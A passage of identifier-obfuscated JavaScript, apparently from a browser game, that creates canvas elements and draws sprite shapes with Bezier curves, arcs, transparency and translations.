			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(143 * ᐃ, ᐃ * 146);
			Δ.bezierCurveTo(ᐃ * 161, ᐃ * 199, 151 * ᐃ, 245 * ᐃ, ᐃ * 138, ᐃ * 266);
			Δ.bezierCurveTo(120.5 * ᐃ, 239.5 * ᐃ, 120.5 * ᐃ, ᐃ * 239.5, ᐃ * 103, 213 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[6], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(283 * ᐃ, ᐃ * 135);
			Δ.bezierCurveTo(277 * ᐃ, ᐃ * 176, ᐃ * 298, ᐃ * 194, 315 * ᐃ, 205 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 323.5, 175 * ᐃ, ᐃ * 323.5, 175 * ᐃ, ᐃ * 332, 145 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⵠⵠ], Ⲇᐃ[6], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(318 * ᐃ, ᐃ * 223);
			Δ.bezierCurveTo(290 * ᐃ, 195 * ᐃ, ᐃ * 271, ᐃ * 256, 283 * ᐃ, 281 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 303.5, ᐃ * 267, 303.5 * ᐃ, 267 * ᐃ, ᐃ * 324, ᐃ * 253);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[ᐃⲆⲆⲆ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 142, ᐃ * 223);
			Δ.bezierCurveTo(128 * ᐃ, 213 * ᐃ, 123 * ᐃ, ᐃ * 214, ᐃ * 111, 223 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[10], Ⲇᐃ[10], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(251 * ᐃ, 133 * ᐃ);
			Δ.bezierCurveTo(269 * ᐃ, ᐃ * 188, 262 * ᐃ, ᐃ * 229, ᐃ * 251, ᐃ * 253);
			Δ.bezierCurveTo(288 * ᐃ, ᐃ * 224, 273 * ᐃ, ᐃ * 139, 252 * ᐃ, ᐃ * 133);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[10], Ⲇᐃ[10], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 203, 102 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 204, 136 * ᐃ, ᐃ * 200, ᐃ * 159, 189 * ᐃ, 174 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 223, 164 * ᐃ, ᐃ * 219, ᐃ * 87, 205 * ᐃ, ᐃ * 83);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔⲆᐃⵠ], Ⲇᐃ[10], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(196 * ᐃ, ᐃ * 324);
			Δ.bezierCurveTo(209 * ᐃ, 239 * ᐃ, 200 * ᐃ, 219 * ᐃ, ᐃ * 192, ᐃ * 196);
			Δ.bezierCurveTo(229 * ᐃ, 216 * ᐃ, 219 * ᐃ, ᐃ * 316, ᐃ * 198, ᐃ * 325);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[10], Ⲇᐃ[ⲆⲆΔΔⲆⲆⵠ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(266 * ᐃ, 166 * ᐃ);
			Δ.bezierCurveTo(249 * ᐃ, 154 * ᐃ, ᐃ * 243, ᐃ * 161, 233 * ᐃ, 167 * ᐃ);
			ΔⲆ(Δ, ⵠⵠⵠⲆⵠ, Ⲇᐃ[ⵠᐃᐃΔΔ], ᐃ * 6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 269, 192 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 256, ᐃ * 183, ᐃ * 241, 186 * ᐃ, 233 * ᐃ, ᐃ * 192);
			ΔⲆ(Δ, undefined, Ⲇᐃ[6], ⲆΔᐃΔⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(263 * ᐃ, ᐃ * 217);
			Δ.bezierCurveTo(ᐃ * 251, ᐃ * 211, 242 * ᐃ, ᐃ * 213, ᐃ * 236, 218 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⲆΔᐃⵠⵠᐃⵠ], ᐃ * 6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 204, ᐃ * 141);
			Δ.bezierCurveTo(ᐃ * 191, 131 * ᐃ, ᐃ * 187, ᐃ * 133, 176 * ᐃ, 141 * ᐃ);
			ΔⲆ(Δ, ⲆⲆⲆⵠⵠ, Ⲇᐃ[ⵠⵠⵠⲆⲆ], ΔᐃⲆᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 207, 230 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 193, ᐃ * 222, 185 * ᐃ, 224 * ᐃ, ᐃ * 177, 231 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠᐃᐃΔΔ], ᐃ * ΔᐃⲆᐃ);
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(210 * ᐃ, ᐃ * 258);
			Δ.bezierCurveTo(196 * ᐃ, 247 * ᐃ, ᐃ * 191, ᐃ * 250, 177 * ᐃ, 259 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[6], ⵠᐃΔⵠᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(145 * ᐃ, ᐃ * 196);
			Δ.bezierCurveTo(130 * ᐃ, ᐃ * 186, 124 * ᐃ, ᐃ * 187, ᐃ * 114, 195 * ᐃ);
			ΔⲆ(Δ, ⲆΔᐃᐃᐃ, Ⲇᐃ[ⲆᐃⲆᐃ], ᐃ * 6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(218 * ᐃ, 97 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 219, 163 * ᐃ, ᐃ * 201, ᐃ * 176, 191 * ᐃ, ᐃ * 175);
			Δ.bezierCurveTo(ᐃ * 176, 177 * ᐃ, ᐃ * 168, ᐃ * 167, 160 * ᐃ, 115 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[6], ᐃ * 6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(224 * ᐃ, ᐃ * 181);
			Δ.bezierCurveTo(ᐃ * 225, ᐃ * 138, 246 * ᐃ, 115 * ᐃ, ᐃ * 263, ᐃ * 137);
			Δ.bezierCurveTo(ᐃ * 282, 174 * ᐃ, 279 * ᐃ, 217 * ᐃ, 265 * ᐃ, 243 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 253, 264 * ᐃ, ᐃ * 240, 256 * ᐃ, 233 * ᐃ, 238 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 221, ᐃ * 212, ᐃ * 225, 198 * ᐃ, ᐃ * 224, 184 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠΔⵠᐃⵠ], ᐃ * ⵠΔΔΔΔⵠⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(169 * ᐃ, ᐃ * 289);
			Δ.bezierCurveTo(ᐃ * 161, 234 * ᐃ, ᐃ * 168, ᐃ * 197, ᐃ * 187, 195 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 219, ᐃ * 189, ᐃ * 222, ᐃ * ⲆⵠᐃΔᐃⵠᐃ, 216 * ᐃ, 307 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆⲆⲆⵠⵠ, Ⲇᐃ[ⵠᐃᐃΔΔ], ᐃ * 6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 143, ᐃ * 146);
			Δ.bezierCurveTo(161 * ᐃ, ᐃ * 199, 151 * ᐃ, 245 * ᐃ, ᐃ * 138, ᐃ * 266);
			Δ.bezierCurveTo(120.5 * ᐃ, 239.5 * ᐃ, 120.5 * ᐃ, 239.5 * ᐃ, 103 * ᐃ, ᐃ * 213);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ΔᐃⲆᐃ], ⵠΔⵠᐃⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(283 * ᐃ, 135 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 277, 176 * ᐃ, ᐃ * 298, 194 * ᐃ, ᐃ * 315, 205 * ᐃ);
			Δ.bezierCurveTo(323.5 * ᐃ, ᐃ * 175, 323.5 * ᐃ, ᐃ * 175, ᐃ * 332, 145 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ΔΔΔⲆΔ, Ⲇᐃ[6], ᐃ * 6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 318, ᐃ * 223);
			Δ.bezierCurveTo(290 * ᐃ, 195 * ᐃ, ᐃ * 271, 256 * ᐃ, ᐃ * 283, 281 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 303.5, ᐃ * 267, 303.5 * ᐃ, ᐃ * 267, ᐃ * 324, ᐃ * 253);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ᐃⵠⵠⲆⵠ], ᐃ * 6);
			ⵠᐃᐃ(Δ, 222 * ᐃ, ᐃ * 199, ᐃ * 120.74767078498864);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠᐃⵠⲆ], ᐃ * 40);
			ⵠᐃᐃ(Δ, 220 * ᐃ, 200 * ᐃ, ᐃ * 95.44108130150245);
			ΔⲆ(Δ, ⲆⲆⲆⵠⵠ, Ⲇᐃ[ⵠΔᐃᐃⵠ], 15 * ᐃ);
			ⵠᐃᐃ(Δ, 220 * ᐃ, 201 * ᐃ, 85 * ᐃ);
			ΔⲆ(Δ, ⲆΔᐃᐃᐃ, Ⲇᐃ[ΔⲆᐃⵠᐃ], 10 * ᐃ);
			Δ.globalAlpha = .5;
			ⵠᐃᐃ(Δ, ᐃ * 220, ᐃ * 201, ᐃ * 82);
			ΔⲆ(Δ, Ⲇᐃ[9]);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ΔⵠΔⵠ;
			Δ.translate(5 * ᐃ, ᐃ * ⲆⲆΔⵠ);
			ⵠᐃᐃ(Δ, ᐃ * 63, 136 * ᐃ, ᐃ * 49.193495504995376);
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ⵠᐃⲆᐃ], ᐃ * ⲆⵠᐃⲆ);
			Δ.globalAlpha = 1;
			Δ.translate(-5 * ᐃ, -ⲆΔⲆᐃ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 63, ᐃ * 136, ᐃ * 49.193495504995376);
			ΔⲆ(Δ, Ⲇᐃ[8], Ⲇᐃ[2], ᐃ * 4);
			ⵠᐃᐃ(Δ, 63 * ᐃ, ᐃ * 137, 25.632011235952593 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃⵠⵠ], Ⲇᐃ[2], ᐃ * 4);
			return Ⲇⵠ
		}

		function ⲆᐃΔΔΔΔᐃⵠⵠ(ᐃ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			if (0 == ⵠᐃ) {
				Ⲇⵠ.width = ᐃ * 543;
				Ⲇⵠ.height = 393 * ᐃ;
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(109.5 * ᐃ, 154.046875 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 143.5, ᐃ * 96.046875, 208.5 * ᐃ, ᐃ * 92.046875, 288.5 * ᐃ, ᐃ * 97.046875);
				Δ.bezierCurveTo(ᐃ * 357.5, 104.046875 * ᐃ, 414.5 * ᐃ, 132.046875 * ᐃ, ᐃ * 422.5, 166.046875 * ᐃ);
				Δ.bezierCurveTo(431.5 * ᐃ, 192.046875 * ᐃ, 400.5 * ᐃ, 261.046875 * ᐃ, 332.5 * ᐃ, 271.046875 * ᐃ);
				Δ.bezierCurveTo(272.5 * ᐃ, ᐃ * 279.046875, 159.5 * ᐃ, 285.046875 * ᐃ, 126.5 * ᐃ, ᐃ * 260.046875);
				Δ.bezierCurveTo(99.5 * ᐃ, ᐃ * 238.046875, ᐃ * 95.5, 183.046875 * ᐃ, 109.5 * ᐃ, ᐃ * 154.046875);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃᐃ])
			} else if (ⵠᐃ == 1) {
				Ⲇⵠ.width = ᐃ * 543;
				Ⲇⵠ.height = ᐃ * 470;
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 216.23297119140625, ᐃ * 100.34944152832031);
				Δ.bezierCurveTo(349.23297119140625 * ᐃ, 110.34944152832031 * ᐃ, ᐃ * 422.23297119140625, 142.3494415283203 * ᐃ, ᐃ * 434.23297119140625, 194.3494415283203 * ᐃ);
				Δ.bezierCurveTo(451.23297119140625 * ᐃ, ᐃ * 268.3494415283203, ᐃ * 397.23297119140625, 367.3494415283203 * ᐃ, ᐃ * 313.23297119140625, 351.3494415283203 * ᐃ);
				Δ.bezierCurveTo(148.23297119140625 * ᐃ, ᐃ * 330.3494415283203, ᐃ * 106.23297119140625, 319.3494415283203 * ᐃ, 87.23297119140625 * ᐃ, 248.3494415283203 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 63.23297119140625, ᐃ * 164.3494415283203, ᐃ * 102.23297119140625, 90.34944152832031 * ᐃ, ᐃ * 216.23297119140625, 100.34944152832031 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0])
			} else {
				Ⲇⵠ.width = 543 * ᐃ;
				Ⲇⵠ.height = ᐃ * 470;
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 155.23297119140625, 126.71307373046875 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 232.23297119140625, ᐃ * 76.71307373046875, ᐃ * 340.23297119140625, 67.71307373046875 * ᐃ, ᐃ * 411.23297119140625, 106.71307373046875 * ᐃ);
				Δ.bezierCurveTo(458.23297119140625 * ᐃ, ᐃ * 131.71307373046875, 465.23297119140625 * ᐃ, 280.71307373046875 * ᐃ, 353.23297119140625 * ᐃ, ᐃ * 363.71307373046875);
				Δ.bezierCurveTo(ᐃ * 299.23297119140625, 404.71307373046875 * ᐃ, 143.23297119140625 * ᐃ, ᐃ * 415.71307373046875, 88.23297119140625 * ᐃ, 327.71307373046875 * ᐃ);
				Δ.bezierCurveTo(48.23297119140625 * ᐃ, ᐃ * 256.71307373046875, 93.23297119140625 * ᐃ, 171.71307373046875 * ᐃ, ᐃ * 155.23297119140625, ᐃ * 126.71307373046875);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0])
			}
			return Ⲇⵠ
		}

		function ᐃⵠΔΔⵠᐃⲆ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 376 * ᐃ;
			Ⲇⵠ.height = ᐃ * 371;
			Δ.globalAlpha = .5;
			Δ.translate(ᐃ * 5, ᐃ * ΔᐃΔⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 191.633544921875, 123.98580932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 215.633544921875, 85.98580932617188 * ᐃ, ᐃ * 187.633544921875, ᐃ * 71.98580932617188, ᐃ * 202.633544921875, ᐃ * 19.985809326171875);
			Δ.bezierCurveTo(ᐃ * 231.633544921875, ᐃ * 68.98580932617188, 253.633544921875 * ᐃ, 71.98580932617188 * ᐃ, 256.633544921875 * ᐃ, ᐃ * 93.98580932617188);
			Δ.bezierCurveTo(ᐃ * 306.633544921875, ᐃ * 64.98580932617188, ᐃ * 319.633544921875, 61.985809326171875 * ᐃ, ᐃ * 350.633544921875, ᐃ * 58.985809326171875);
			Δ.bezierCurveTo(280.633544921875 * ᐃ, 86.98580932617188 * ᐃ, ᐃ * 281.633544921875, 106.98580932617188 * ᐃ, 268.633544921875 * ᐃ, 130.98580932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 295.633544921875, 158.98580932617188 * ᐃ, ᐃ * 328.633544921875, ᐃ * 155.98580932617188, ᐃ * 353.633544921875, ᐃ * 90.98580932617188);
			Δ.bezierCurveTo(371.633544921875 * ᐃ, ᐃ * 158.98580932617188, ᐃ * 337.633544921875, 210.98580932617188 * ᐃ, ᐃ * 286.633544921875, ᐃ * 209.98580932617188);
			Δ.bezierCurveTo(323.633544921875 * ᐃ, 230.98580932617188 * ᐃ, ᐃ * 317.633544921875, 274.9858093261719 * ᐃ, 356.633544921875 * ᐃ, 305.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 288.633544921875, 297.9858093261719 * ᐃ, ᐃ * 288.633544921875, ᐃ * 265.9858093261719, 275.633544921875 * ᐃ, 266.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 280.633544921875, ᐃ * 294.9858093261719, 315.633544921875 * ᐃ, ᐃ * 306.9858093261719, ᐃ * 336.633544921875, ᐃ * 316.9858093261719);
			Δ.bezierCurveTo(295.633544921875 * ᐃ, 318.9858093261719 * ᐃ, ᐃ * 264.633544921875, ᐃ * 302.9858093261719, 254.633544921875 * ᐃ, 289.9858093261719 * ᐃ);
			Δ.bezierCurveTo(252.633544921875 * ᐃ, ᐃ * 301.9858093261719, ᐃ * 224.633544921875, ᐃ * 315.9858093261719, ᐃ * 201.633544921875, 356.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 195.633544921875, ᐃ * 313.9858093261719, ᐃ * 195.633544921875, ᐃ * 308.9858093261719, ᐃ * 196.633544921875, ᐃ * 307.9858093261719);
			Δ.bezierCurveTo(ᐃ * 197.633544921875, ᐃ * 289.9858093261719, ᐃ * 207.633544921875, ᐃ * 283.9858093261719, ᐃ * 195.633544921875, ᐃ * 258.9858093261719);
			Δ.bezierCurveTo(182.633544921875 * ᐃ, ᐃ * 282.9858093261719, 190.633544921875 * ᐃ, ᐃ * 287.9858093261719, 193.633544921875 * ᐃ, ᐃ * 297.9858093261719);
			Δ.bezierCurveTo(195.633544921875 * ᐃ, 306.9858093261719 * ᐃ, ᐃ * 191.633544921875, ᐃ * 334.9858093261719, 187.633544921875 * ᐃ, 354.9858093261719 * ᐃ);
			Δ.bezierCurveTo(165.633544921875 * ᐃ, ᐃ * 320.9858093261719, 138.633544921875 * ᐃ, ᐃ * 307.9858093261719, 135.633544921875 * ᐃ, 288.9858093261719 * ᐃ);
			Δ.bezierCurveTo(110.633544921875 * ᐃ, 318.9858093261719 * ᐃ, ᐃ * 68.633544921875, 323.9858093261719 * ᐃ, ᐃ * 49.633544921875, ᐃ * 320.9858093261719);
			Δ.bezierCurveTo(88.633544921875 * ᐃ, 308.9858093261719 * ᐃ, ᐃ * 108.633544921875, ᐃ * 284.9858093261719, ᐃ * 118.633544921875, 258.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 86.633544921875, ᐃ * 264.9858093261719, ᐃ * 75.633544921875, 310.9858093261719 * ᐃ, 19.633544921875 * ᐃ, ᐃ * 304.9858093261719);
			Δ.bezierCurveTo(54.633544921875 * ᐃ, 276.9858093261719 * ᐃ, ᐃ * 59.633544921875, ᐃ * 214.98580932617188, ᐃ * 105.633544921875, 205.98580932617188 * ᐃ);
			Δ.bezierCurveTo(14.633544921875 * ᐃ, 201.98580932617188 * ᐃ, ᐃ * 24.633544921875, 141.98580932617188 * ᐃ, 25.633544921875 * ᐃ, 82.98580932617188 * ᐃ);
			Δ.bezierCurveTo(49.633544921875 * ᐃ, 168.98580932617188 * ᐃ, ᐃ * 87.633544921875, 141.98580932617188 * ᐃ, ᐃ * 112.633544921875, ᐃ * 123.98580932617188);
			Δ.bezierCurveTo(ᐃ * 95.633544921875, ᐃ * 75.98580932617188, ᐃ * 70.633544921875, 68.98580932617188 * ᐃ, 35.633544921875 * ᐃ, 50.985809326171875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 70.633544921875, 53.985809326171875 * ᐃ, ᐃ * 102.633544921875, 65.98580932617188 * ᐃ, ᐃ * 125.633544921875, 84.98580932617188 * ᐃ);
			Δ.bezierCurveTo(133.633544921875 * ᐃ, ᐃ * 69.98580932617188, 166.633544921875 * ᐃ, 42.985809326171875 * ᐃ, ᐃ * 176.633544921875, 21.985809326171875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 185.633544921875, ᐃ * 49.985809326171875, ᐃ * 168.633544921875, ᐃ * 95.98580932617188, ᐃ * 191.633544921875, 121.98580932617188 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠⵠ]);
			Δ.globalAlpha = ⵠⲆΔ;
			Δ.translate(-4 * ᐃ, -ΔⲆΔΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(191.633544921875 * ᐃ, 123.98580932617188 * ᐃ);
			Δ.bezierCurveTo(215.633544921875 * ᐃ, ᐃ * 85.98580932617188, 187.633544921875 * ᐃ, ᐃ * 71.98580932617188, 202.633544921875 * ᐃ, 19.985809326171875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 231.633544921875, ᐃ * 68.98580932617188, 253.633544921875 * ᐃ, 71.98580932617188 * ᐃ, ᐃ * 256.633544921875, ᐃ * 93.98580932617188);
			Δ.bezierCurveTo(ᐃ * 306.633544921875, 64.98580932617188 * ᐃ, ᐃ * 319.633544921875, 61.985809326171875 * ᐃ, ᐃ * 350.633544921875, 58.985809326171875 * ᐃ);
			Δ.bezierCurveTo(280.633544921875 * ᐃ, 86.98580932617188 * ᐃ, 281.633544921875 * ᐃ, ᐃ * 106.98580932617188, 268.633544921875 * ᐃ, 130.98580932617188 * ᐃ);
			Δ.bezierCurveTo(295.633544921875 * ᐃ, 158.98580932617188 * ᐃ, ᐃ * 328.633544921875, ᐃ * 155.98580932617188, 353.633544921875 * ᐃ, ᐃ * 90.98580932617188);
			Δ.bezierCurveTo(371.633544921875 * ᐃ, ᐃ * 158.98580932617188, ᐃ * 337.633544921875, ᐃ * 210.98580932617188, ᐃ * 286.633544921875, ᐃ * 209.98580932617188);
			Δ.bezierCurveTo(ᐃ * 323.633544921875, ᐃ * 230.98580932617188, ᐃ * 317.633544921875, ᐃ * 274.9858093261719, ᐃ * 356.633544921875, 305.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 288.633544921875, ᐃ * 297.9858093261719, 288.633544921875 * ᐃ, ᐃ * 265.9858093261719, ᐃ * 275.633544921875, ᐃ * 266.9858093261719);
			Δ.bezierCurveTo(280.633544921875 * ᐃ, ᐃ * 294.9858093261719, ᐃ * 315.633544921875, ᐃ * 306.9858093261719, 336.633544921875 * ᐃ, 316.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 295.633544921875, 318.9858093261719 * ᐃ, 264.633544921875 * ᐃ, ᐃ * 302.9858093261719, ᐃ * 254.633544921875, ᐃ * 289.9858093261719);
			Δ.bezierCurveTo(ᐃ * 252.633544921875, 301.9858093261719 * ᐃ, 224.633544921875 * ᐃ, 315.9858093261719 * ᐃ, 201.633544921875 * ᐃ, 356.9858093261719 * ᐃ);
			Δ.bezierCurveTo(195.633544921875 * ᐃ, 313.9858093261719 * ᐃ, ᐃ * 195.633544921875, 308.9858093261719 * ᐃ, ᐃ * 196.633544921875, 307.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 197.633544921875, ᐃ * 289.9858093261719, 207.633544921875 * ᐃ, 283.9858093261719 * ᐃ, ᐃ * 195.633544921875, 258.9858093261719 * ᐃ);
			Δ.bezierCurveTo(182.633544921875 * ᐃ, 282.9858093261719 * ᐃ, 190.633544921875 * ᐃ, 287.9858093261719 * ᐃ, 193.633544921875 * ᐃ, ᐃ * 297.9858093261719);
			Δ.bezierCurveTo(195.633544921875 * ᐃ, 306.9858093261719 * ᐃ, 191.633544921875 * ᐃ, ᐃ * 334.9858093261719, ᐃ * 187.633544921875, ᐃ * 354.9858093261719);
			Δ.bezierCurveTo(ᐃ * 165.633544921875, 320.9858093261719 * ᐃ, ᐃ * 138.633544921875, ᐃ * 307.9858093261719, 135.633544921875 * ᐃ, ᐃ * 288.9858093261719);
			Δ.bezierCurveTo(110.633544921875 * ᐃ, ᐃ * 318.9858093261719, 68.633544921875 * ᐃ, ᐃ * 323.9858093261719, 49.633544921875 * ᐃ, 320.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 88.633544921875, ᐃ * 308.9858093261719, ᐃ * 108.633544921875, ᐃ * 284.9858093261719, 118.633544921875 * ᐃ, ᐃ * 258.9858093261719);
			Δ.bezierCurveTo(86.633544921875 * ᐃ, ᐃ * 264.9858093261719, 75.633544921875 * ᐃ, 310.9858093261719 * ᐃ, ᐃ * 19.633544921875, 304.9858093261719 * ᐃ);
			Δ.bezierCurveTo(54.633544921875 * ᐃ, 276.9858093261719 * ᐃ, 59.633544921875 * ᐃ, 214.98580932617188 * ᐃ, ᐃ * 105.633544921875, ᐃ * 205.98580932617188);
			Δ.bezierCurveTo(14.633544921875 * ᐃ, ᐃ * 201.98580932617188, ᐃ * 24.633544921875, ᐃ * 141.98580932617188, ᐃ * 25.633544921875, 82.98580932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 49.633544921875, ᐃ * 168.98580932617188, 87.633544921875 * ᐃ, 141.98580932617188 * ᐃ, 112.633544921875 * ᐃ, 123.98580932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 95.633544921875, ᐃ * 75.98580932617188, ᐃ * 70.633544921875, 68.98580932617188 * ᐃ, 35.633544921875 * ᐃ, 50.985809326171875 * ᐃ);
			Δ.bezierCurveTo(70.633544921875 * ᐃ, ᐃ * 53.985809326171875, ᐃ * 102.633544921875, ᐃ * 65.98580932617188, 125.633544921875 * ᐃ, 84.98580932617188 * ᐃ);
			Δ.bezierCurveTo(133.633544921875 * ᐃ, 69.98580932617188 * ᐃ, ᐃ * 166.633544921875, ᐃ * 42.985809326171875, 176.633544921875 * ᐃ, ᐃ * 21.985809326171875);
			Δ.bezierCurveTo(185.633544921875 * ᐃ, ᐃ * 49.985809326171875, ᐃ * 168.633544921875, 95.98580932617188 * ᐃ, ᐃ * 191.633544921875, ᐃ * 121.98580932617188);
			Δ.closePath();
			ΔⲆ(Δ, ⲆⲆⲆⲆᐃ, Ⲇᐃ[1], ᐃ * ⲆⲆΔΔⵠΔⲆ);
			Δ.translate(ᐃ * -ΔⵠΔⵠ, Ⲇᐃᐃᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(270.633544921875 * ᐃ, 88.98580932617188 * ᐃ);
			Δ.bezierCurveTo(296.633544921875 * ᐃ, ᐃ * 65.98580932617188, ᐃ * 318.633544921875, ᐃ * 62.985809326171875, 348.633544921875 * ᐃ, ᐃ * 57.985809326171875);
